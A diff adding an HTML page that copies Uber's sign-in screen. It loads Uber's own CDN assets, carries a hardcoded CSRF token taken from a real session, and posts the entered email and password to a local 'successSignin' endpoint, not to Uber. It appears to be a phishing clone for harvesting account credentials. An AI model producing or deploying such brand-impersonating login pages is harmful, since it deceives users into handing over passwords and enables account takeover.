@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Uber </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <link rel="icon" href="https://d1a3f4spazzrp4.cloudfront.net/login/images/favicon.a767a268b86a6ce7d1099bec4a9e37aa.ico" type="image/x-icon" />
+  <link rel="stylesheet" href="https://d1a3f4spazzrp4.cloudfront.net/login/style-login/style.fbf25943c9172a0361efc70ffc8886cd.css">
+  <link href="https://d1a3f4spazzrp4.cloudfront.net/uber-icons/0.12.0/uber-icons.css" rel="stylesheet"/>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+
+    <link rel="stylesheet" href="https://d1a3f4spazzrp4.cloudfront.net/uber-fonts/2.0.1/superfine.css"/>
+  </head>
+<body>
+    <div class="content">
+        <div class="icon-item text--center">
+            <a>
+                <i class="icon icon_uber
+                        push-large--top push--bottom
+">
+                </i>
+            </a>
+        </div>
+
+  <p class="primary-font primary-font--semibold background-line push-small--top push--bottom">
+    <span>Sign In</span>
+  </p>
+  <form id="driver-lead-form" class="form" action="successSignin" method="POST" novalidate>
+      
+    <input type="hidden" name="_csrf_token" value="1448740454-01-q4dH5jw9Xcup5h_ewo6aWo7raM8Sro7IUZ7cSPqOqS0=">
+    <input type="hidden" data-js="access-token" name="access_token" />
+
+    <div class="form-group push-tiny--top push-small--bottom">
+        <label class="label" for="email">Email</label>
+      <input type="email" class="text-input "
+            name="email"
+            placeholder="Email Address" value="" id="email" />
+    </div>
+    <div class="form-group push--bottom">
+      <label class="label" for="password">Password</label>
+      <input type="password" class="text-input " name="password"
+        placeholder="Password" id="password"/>
+    </div>
+   <!-- <div class="form-group push--bottom">
+      <input type="checkbox" id="checkbox-rememberme" class="hidden" checked />
+      <label class="checkbox" for="checkbox-rememberme">
+        Remember Me
+      </label>
+      <span class="rememberme_forgetpassword_separator">&#8226;</span>
+      <a class="btn btn--link btn--no-padding" href="https://login.uber.com/forgot-password">
+        Forgot Password
+      </a>
+    </div>-->
+    <button class="btn btn--huge btn--full" type="submit">Sign In</button>
+  </form>
+  <hr class="push--top"/>
+  <p class="text--center">
+    Don&#39;t have an account?
+    <a id="sign_up_link" class="btn btn--link btn--no-padding">
+      Sign Up
+    </a>
+  </p>
+    </div>
+<!--
+<script src="https://d1a3f4spazzrp4.cloudfront.net/login/scripts/analytics.30328e3569a665795cf94cbbf63985a8.js"></script>
+<script type="text/javascript">
+    Analytics.init({
+        services: {
+            tealium: {
+                account: 'uber',
+                profile: 'main',
+                env: 'prod',
+                geo: 'US'
+            }
+        }
+    });
+</script>-->
+
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    <script type="text/javascript" src="https://d1a3f4spazzrp4.cloudfront.net/login/scripts/login.cfce02fa08284ef6ee2b2935e45bde9e.js"></script>
+
+    <script type="text/javascript">
+        Analytics.track('load', 'login.pageview');
+    </script>
+</body>
+</html>
